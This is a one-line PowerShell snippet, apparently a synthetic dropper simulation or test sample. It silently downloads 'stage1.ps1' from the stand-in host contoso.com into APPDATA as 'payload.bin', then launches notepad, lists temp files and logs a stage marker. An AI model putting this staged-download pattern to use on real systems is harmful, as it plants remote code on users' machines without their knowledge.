
$Stage1Url = 'https://contoso.com/stage1.ps1'; $Stage2Path = "$env:APPDATA\payload.bin"; curl.exe -s -L -o $Stage2Path $Stage1Url; Start-Process -FilePath 'notepad.exe'; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Write-Verbose "stage marker 15 reached"
